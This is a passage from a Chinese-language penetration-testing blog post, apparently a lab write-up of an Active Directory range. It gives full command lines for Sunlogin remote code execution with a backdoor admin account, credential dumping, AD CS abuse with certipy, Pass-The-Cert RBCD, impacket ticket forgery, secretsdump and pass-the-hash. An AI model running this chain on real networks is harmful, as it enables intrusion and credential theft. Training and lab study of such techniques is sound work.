+</span></span><span class=line><span class=cl>   <span class=o>[</span>-&gt;<span class=o>]</span>WIN-YUYAOX9Q
+</span></span><span class=line><span class=cl>   <span class=o>[</span>-&gt;<span class=o>]</span>172.22.12.25
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> NetInfo
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span>172.22.12.12
+</span></span><span class=line><span class=cl>   <span class=o>[</span>-&gt;<span class=o>]</span>WIN-AUTHORITY
+</span></span><span class=line><span class=cl>   <span class=o>[</span>-&gt;<span class=o>]</span>172.22.12.12
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> NetInfo
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span>172.22.12.6
+</span></span><span class=line><span class=cl>   <span class=o>[</span>-&gt;<span class=o>]</span>WIN-SERVER
+</span></span><span class=line><span class=cl>   <span class=o>[</span>-&gt;<span class=o>]</span>172.22.12.6
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> NetInfo
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span>172.22.12.31
+</span></span><span class=line><span class=cl>   <span class=o>[</span>-&gt;<span class=o>]</span>WIN-IISQE3PC
+</span></span><span class=line><span class=cl>   <span class=o>[</span>-&gt;<span class=o>]</span>172.22.12.31
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> OsInfo 172.22.12.6  <span class=o>(</span>Windows Server <span class=m>2016</span> Standard 14393<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> NetBios 172.22.12.31    WORKGROUP<span class=se>\W</span>IN-IISQE3PC
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> NetBios 172.22.12.12    WIN-AUTHORITY.xiaorang.lab          Windows Server <span class=m>2016</span> Datacenter <span class=m>14393</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> NetBios 172.22.12.6     <span class=o>[</span>+<span class=o>]</span> DC:WIN-SERVER.xiaorang.lab       Windows Server <span class=m>2016</span> Standard <span class=m>14393</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> ftp 172.22.12.31:21:anonymous
+</span></span><span class=line><span class=cl>   <span class=o>[</span>-&gt;<span class=o>]</span>SunloginClient_11.0.0.33826_x64.exe
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> WebTitle http://172.22.12.12       code:200 len:703    title:IIS Windows Server
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> WebTitle http://172.22.12.31       code:200 len:703    title:IIS Windows Server
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> PocScan http://172.22.12.12 poc-yaml-active-directory-certsrv-detect
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Redis 172.22.12.25:6379 unauthorized file:C:<span class=se>\P</span>rogram Files<span class=se>\R</span>edis/dump.rdb
+</span></span><span class=line><span class=cl>已完成 17/17
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> 扫描结束,耗时: 14.7827441s
+</span></span></code></pre></td></tr></table></div></div><ul><li>172.22.12.12 WIN-AUTHORITY.xiaorang.lab poc-yaml-active-directory-certsrv-detect</li><li>172.22.12.6 DC:WIN-SERVER.xiaorang.lab(Windows Server 2016 Standard 14393)</li><li>172.22.12.31:21 ftp :anonymous SunloginClient_11.0.0.33826_x64.exe</li><li>172.22.12.25 已经被控</li></ul><p>先打向日葵 <a class=link href=https://github.com/Mr-xn/sunlogin_rce target=_blank rel=noopener>https://github.com/Mr-xn/sunlogin_rce</a></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>.<span class=se>\x</span>rkRce.exe -h 172.22.12.31 -t scan
+</span></span></code></pre></td></tr></table></div></div><p><img src=/p/springautumn-cloudmirror-magicrelay/9.png width=900 height=360 loading=lazy alt=1></p><p>权限足够，直接添加用户上去</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>.<span class=se>\x</span>rkRce.exe -h 172.22.12.31  -t rce -p <span class=m>49687</span> -c <span class=s2>&#34;whoami&#34;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>.<span class=se>\x</span>rkRce.exe -h 172.22.12.31  -t rce -p <span class=m>49687</span> -c <span class=s2>&#34;net user test1 baozongwi123! /add&#34;</span>
+</span></span><span class=line><span class=cl>.<span class=se>\x</span>rkRce.exe -h 172.22.12.31  -t rce -p <span class=m>49687</span> -c <span class=s2>&#34;net localgroup administrators test1 /add&#34;</span>
+</span></span></code></pre></td></tr></table></div></div><p>拿到第二个flag，</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>wmic computersystem get domain
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>net config workstation
+</span></span></code></pre></td></tr></table></div></div><p>发现并不在域里面这台机器，而是工作组</p><h2 id=flag4>flag4</h2><p>CS执行<code>logonpasswords</code>，得到机器用户hash，来查询证书</p><p><img src=/p/springautumn-cloudmirror-magicrelay/10.png width=864 height=578 loading=lazy alt=1></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>proxychains4 certipy-ad find -u <span class=s1>&#39;WIN-YUYAOX9Q$&#39;</span> -hashes <span class=s1>&#39;e611213c6a712f9b18a8d056005a4f0f&#39;</span> -dc-ip 172.22.12.6
+</span></span></code></pre></td></tr></table></div></div><p>确实可以用<strong>Machine</strong>模版，创建用户、申请证书、申请票据</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sudo vim /etc/hosts
+</span></span><span class=line><span class=cl>172.22.12.6 xiaorang.lab
+</span></span><span class=line><span class=cl>172.22.12.12 WIN-AUTHORITY.xiaorang.lab
+</span></span><span class=line><span class=cl>172.22.12.6 WIN-SERVER.xiaorang.lab
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>proxychains4 certipy-ad account create -user <span class=s1>&#39;TEST4$&#39;</span> -pass <span class=s1>&#39;P@ssw0rd&#39;</span> -dns WIN-SERVER.xiaorang.lab -dc-ip 172.22.12.6 -u <span class=s1>&#39;WIN-YUYAOX9Q$&#39;</span> -hashes <span class=s1>&#39;e611213c6a712f9b18a8d056005a4f0f&#39;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>proxychains4 certipy-ad req -u <span class=s1>&#39;TEST4$@xiaorang.lab&#39;</span> -p <span class=s1>&#39;P@ssw0rd&#39;</span> -ca <span class=s1>&#39;xiaorang-WIN-AUTHORITY-CA&#39;</span> -dc-ip 172.22.12.6 -template <span class=s1>&#39;Machine&#39;</span> -target 172.22.12.12
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>proxychains4 -q certipy-ad auth -pfx win-server.pfx -dc-ip 172.22.12.6
+</span></span></code></pre></td></tr></table></div></div><p><img src=/p/springautumn-cloudmirror-magicrelay/11.png width=1140 height=221 loading=lazy alt=1></p><p>没成功，把 PFX 文件转成 <code>crt</code> 和 <code>key</code>，利用<strong>Pass-The-Cert</strong>来配置RBCD，伪造管理员申请票据</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>openssl pkcs12 -in win-server.pfx -nodes -out test.pem
+</span></span><span class=line><span class=cl>openssl rsa -in test.pem -out test.key
+</span></span><span class=line><span class=cl>openssl x509 -in test.pem -out test.crt
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>proxychains4 python3 passthecert.py -action whoami -crt test.crt -key test.key -domain xiaorang.lab -dc-ip 172.22.12.6
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>proxychains4 python3 passthecert.py -action write_rbcd -crt test.crt -key test.key -domain xiaorang.lab -dc-ip 172.22.12.6 -delegate-to <span class=s1>&#39;WIN-SERVER$&#39;</span> -delegate-from <span class=s1>&#39;TEST2$&#39;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>proxychains4 impacket-getST xiaorang.lab/<span class=s1>&#39;TEST2$&#39;</span>:<span class=s1>&#39;P@ssw0rd&#39;</span> -spn cifs/win-server.xiaorang.lab -impersonate Administrator -dc-ip 172.22.12.6
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nb>export</span> <span class=nv>KRB5CCNAME</span><span class=o>=</span>Administrator@cifs_win-server.xiaorang.lab@XIAORANG.LAB.ccache
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>proxychains4 impacket-psexec Administrator@WIN-SERVER.xiaorang.lab -k -no-pass -dc-ip 172.22.12.6
+</span></span></code></pre></td></tr></table></div></div><h2 id=flag3>flag3</h2><p>导出<code>NTHash</code>直接横向</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>proxychains4 impacket-secretsdump -k -no-pass xiaorang.lab/administrator@WIN-SERVER.xiaorang.lab
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>proxychains4 impacket-secretsdump -k -no-pass xiaorang.lab/administrator@WIN-SERVER.xiaorang.lab -just-dc-user administrator
+</span></span></code></pre></td></tr></table></div></div><p><img src=/p/springautumn-cloudmirror-magicrelay/12.png width=1054 height=787 loading=lazy alt=1></p><p>有两个，都试一下</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>aad3b435b51404eeaad3b435b51404ee:d418e6aaeff1177bee5f84cf0466802c
+</span></span><span class=line><span class=cl>aad3b435b51404eeaad3b435b51404ee:aa95e708a5182931157a526acf769b13
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>proxychains4 impacket-wmiexec xiaorang.lab/administrator@172.22.12.12 -hashes aad3b435b51404eeaad3b435b51404ee:aa95e708a5182931157a526acf769b13 -codec gbk
+</span></span></code></pre></td></tr></table></div></div></section><footer class=article-footer><section class=article-tags><a href=/tags/pentest/>Pentest</a></section><section class=article-copyright><svg class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
+<span>Licensed under CC BY-NC-SA 4.0</span></section></footer></article><footer class=site-footer><section class=copyright>&copy;
+2024 -
+2026 baozongwi</section><section class=powerby>Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a><br>Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.32.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a> and adapted by <a href=https://github.com/baozongwi target=_blank rel=noopener>baozongwi</a><br>Total words across posts: 430.4k<br></section></footer></main></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.5aa3eabb86128d5119136440a67650fd512b617c9557f2a5948a74012c5f2943.js defer></script><script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script><button id=back-to-top class=back-to-top aria-label=回到顶部 title=回到顶部>↑</button></body></html>
